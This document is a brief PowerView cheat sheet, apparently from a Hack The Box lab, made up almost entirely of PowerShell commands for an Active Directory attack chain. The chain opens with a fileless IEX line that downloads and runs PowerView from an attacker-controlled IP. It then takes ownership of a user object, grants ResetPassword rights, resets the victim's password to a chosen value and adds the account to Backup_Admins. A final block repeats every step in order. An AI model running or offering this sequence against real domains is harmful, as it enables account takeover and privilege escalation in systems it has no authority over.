# PowerView.ps1

## Fileless (Running PS1 without saving to disk)
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerView.ps1')
```

## Take Ownership over User
- Prerequisite is to have PowerView loaded

```
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## Reset Password
- Prerequisite is to have PowerView loaded
- Take ownership of user

```
Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
$pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force
Set-DomainUserPassword Herman -AccountPassword $pass -Verbose
```

## Build New Credential
```
$pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
```

## Add user to group
## Reset Password
- Prerequisite is to have PowerView loaded
- Take ownership of user
- Build the $cred
```
Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
```

## Check AD Groups with PowerView
```
Get-DomainGroup -MemberIdentity Herman | select SamAccountName
```

## All Steps in Order
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerView.ps1')
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
$pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force
Set-DomainUserPassword Herman -AccountPassword $pass -Verbose
$cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
Get-DomainGroup -MemberIdentity Herman | select SamAccountName
```